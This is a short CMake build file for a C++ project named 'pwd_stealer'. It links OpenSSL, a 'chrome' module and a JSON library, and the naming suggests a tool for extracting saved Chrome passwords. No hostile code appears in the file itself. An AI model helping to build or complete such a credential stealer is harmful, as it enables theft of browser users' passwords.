cmake_minimum_required(VERSION 3.8.0)
project(pwd_stealer)

find_package(OpenSSL REQUIRED)

set(CMAKE_INSTALL_PREFIX ${CMAKE_CURRENT_SOURCE_DIR})
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/include ${OPENSSL_INCLUDE_DIR})
add_executable(${PROJECT_NAME} src/main.cpp "include/chrome.hpp" "include/nlohmann/json.hpp")
set(CPACK_PROJECT_NAME ${PROJECT_NAME})
set(CMAKE_CXX_STANDART 17)
set_property(TARGET ${PROJECT_NAME} PROPERTY CXX_STANDARD 17)
add_subdirectory(chrome)
target_link_libraries(${PROJECT_NAME} chrome ${OPENSSL_CRYPTO_LIBRARY})
install(TARGETS ${PROJECT_NAME} DESTINATION bin)